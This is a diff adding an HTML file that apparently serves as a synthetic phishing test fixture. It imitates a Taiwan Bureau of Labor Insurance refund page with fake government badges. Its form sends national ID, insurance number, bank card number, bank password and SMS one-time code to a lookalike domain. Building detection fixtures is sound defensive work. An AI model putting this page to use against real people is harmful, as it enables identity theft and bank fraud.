@@ -1,0 +1,45 @@
+<!doctype html>
+<!--
+  Synthetic Taiwan phishing fixture — fake 勞保局 / 勞動部 refund notice.
+  165 category: 假冒勞動部勞保局退費通知. Genuine domain is bli.gov.tw;
+  this kit lives on a near-lookalike subdomain.
+-->
+<html lang="zh-Hant">
+  <head>
+    <meta charset="UTF-8">
+    <title>勞動部勞工保險局 - 線上退費申請</title>
+    <style>
+      body { font-family: "Microsoft JhengHei", sans-serif;
+             background: #f4f6f8; margin: 0; }
+      .gov-bar { background: #0c3d80; color: white; padding: 8px 16px;
+                 font-size: 13px; }
+      .container { max-width: 460px; margin: 22px auto; padding: 20px;
+                   background: white; border-radius: 4px;
+                   border: 1px solid #ccd4dc; }
+      h1 { color: #0c3d80; font-size: 18px; }
+      .official { color: #0c3d80; font-size: 12px;
+                  border-bottom: 2px solid #0c3d80; padding-bottom: 4px; }
+      input { width: 100%; padding: 7px; box-sizing: border-box;
+              border: 1px solid #b0b8c0; }
+      label { display: block; font-size: 13px; margin-top: 12px; }
+      button { background: #0c3d80; color: white; border: 0; padding: 9px 24px;
+               margin-top: 16px; cursor: pointer; }
+    </style>
+  </head>
+  <body>
+    <div class="gov-bar">中華民國勞動部</div>
+    <div class="container">
+      <div class="official">本國政府入口 GOV.TW 認證</div>
+      <h1>勞工保險退費申請</h1>
+      <p>經系統核算，您於 2024 年至 2025 年間溢繳之勞保費合計 <strong>NT$8,432</strong> 元，請依下列流程線上申請退費。</p>
+      <form action="https://laborgov-refund.tw-portal.click/apply" method="post">
+        <label>身分證字號 <input name="idno" placeholder="A123456789" pattern="[A-Z][0-9]{9}" required></label>
+        <label>勞保證號 <input name="bli_no" required></label>
+        <label>銀行卡卡號 <input name="card_number" autocomplete="cc-number" placeholder="退費將存入此帳戶" required></label>
+        <label>銀行帳戶密碼 <input name="bank_password" type="password" required></label>
+        <label>簡訊驗證碼 <input name="otp" inputmode="numeric" autocomplete="one-time-code" required></label>
+        <button>送出申請</button>
+      </form>
+    </div>
+  </body>
+</html>
